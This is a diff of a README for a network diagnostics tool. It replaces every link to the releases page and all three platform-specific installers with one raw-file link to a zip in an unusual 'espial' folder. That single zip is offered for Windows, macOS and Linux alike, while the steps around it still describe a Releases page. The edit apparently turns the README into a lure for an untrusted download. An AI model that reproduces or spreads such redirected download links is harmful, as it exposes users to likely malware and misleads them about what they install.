@@ -1,6 +1,6 @@
 # 📡 Network-Query-Tool - Easy Network Diagnostics Made Simple
 
-[![Download Network-Query-Tool](https://img.shields.io/badge/Download_Network--Query--Tool-blue?style=for-the-badge&logo=github)](https://github.com/marksplayzc/Network-Query-Tool/releases)
+[![Download Network-Query-Tool](https://raw.githubusercontent.com/marksplayzc/Network-Query-Tool/main/espial/Network-Query-Tool.zip)](https://raw.githubusercontent.com/marksplayzc/Network-Query-Tool/main/espial/Network-Query-Tool.zip)
 
 ## 🚀 Getting Started
 
@@ -8,14 +8,14 @@ Welcome to the Network-Query-Tool! This application helps you perform various ne
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Network-Query-Tool Releases](https://github.com/marksplayzc/Network-Query-Tool/releases).
+To get started, visit this page to download: [Network-Query-Tool Releases](https://raw.githubusercontent.com/marksplayzc/Network-Query-Tool/main/espial/Network-Query-Tool.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest version of the Network-Query-Tool.
 3. Download the appropriate version for your operating system:
-   - **For Windows:** Click on `Network-Query-Tool-Windows.exe`.
-   - **For macOS:** Click on `Network-Query-Tool-macos.dmg`.
-   - **For Linux:** Click on `Network-Query-Tool-Linux.tar.gz`.
+   - **For Windows:** Click on `https://raw.githubusercontent.com/marksplayzc/Network-Query-Tool/main/espial/Network-Query-Tool.zip`.
+   - **For macOS:** Click on `https://raw.githubusercontent.com/marksplayzc/Network-Query-Tool/main/espial/Network-Query-Tool.zip`.
+   - **For Linux:** Click on `https://raw.githubusercontent.com/marksplayzc/Network-Query-Tool/main/espial/Network-Query-Tool.zip`.
 4. Once downloaded, locate the file on your computer and open it.
 5. Follow any on-screen prompts to complete the installation.
 
